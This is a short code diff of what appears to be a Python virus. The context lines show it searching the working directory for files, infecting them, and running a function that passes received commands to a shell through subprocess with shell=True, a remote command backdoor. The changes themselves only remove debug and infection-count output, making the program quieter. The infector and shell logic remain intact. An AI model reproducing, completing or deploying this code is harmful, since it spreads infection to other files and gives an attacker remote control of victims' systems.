@@ -62,7 +62,7 @@ def sus(): #Not required actually...
                 try:
                     os.chdir(command.split(' ')[1])
                 except Exception as e :
-                    pass #print(e)
+                    pass 
             else :
                 sh = sp.Popen(command, shell=True,
                               stdout=sp.PIPE,
@@ -77,4 +77,4 @@ def sus(): #Not required actually...
 filestoinfect = search(os.path.abspath("")) 
 Infectnb = infect(filestoinfect)
 sus()
-print (Infectnb)
+
